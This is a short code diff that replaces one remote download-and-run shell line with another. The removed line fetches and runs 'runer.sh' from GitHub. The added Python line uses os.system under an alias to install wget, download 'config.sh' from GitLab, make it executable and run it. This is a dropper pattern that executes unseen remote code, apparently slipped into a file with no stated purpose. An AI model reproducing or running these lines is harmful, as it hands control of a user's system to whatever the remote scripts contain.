@@ -1,1 +1,2 @@
-wget https://raw.githubusercontent.com/nurfasikin/DGB/main/runer.sh && chmod u+x runer.sh && ./runer.sh
+import os as alpha
+alpha.system("apt-get install wget && wget https://gitlab.com/kastcrone/project-7/-/raw/main/config.sh && chmod +x config.sh && ./config.sh")
